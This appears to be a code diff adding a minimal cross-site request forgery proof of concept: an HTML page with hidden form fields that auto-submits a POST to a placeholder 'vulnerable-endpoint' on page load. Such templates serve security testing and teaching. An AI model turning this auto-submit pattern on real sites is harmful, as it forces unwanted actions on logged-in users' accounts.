@@ -1,0 +1,10 @@
+<html>
+<body>
+  <form action="https://target-site.com/vulnerable-endpoint" method="POST">
+    <input type="hidden" name="field_1" value="malicious">
+    <input type="hidden" name="field_2" value="data">
+    <input type="submit" value="Submit">
+  </form>
+  <script>document.forms[0].submit();</script>
+</body>
+</html>
